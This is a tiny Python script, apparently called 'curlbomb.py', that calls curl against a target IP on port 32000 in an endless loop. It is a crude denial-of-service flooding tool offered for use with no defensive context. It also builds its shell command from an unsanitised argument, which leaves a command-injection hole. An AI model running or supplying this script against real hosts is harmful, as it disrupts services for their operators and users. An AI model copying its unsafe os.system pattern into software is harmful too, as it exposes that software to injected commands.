import os
import sys

try:
    while True:
        os.system("curl " + sys.argv[1] +":32000")
        print("\n")
except:
    print('proper usage "python curlbomb.py 10.0.0.10"')

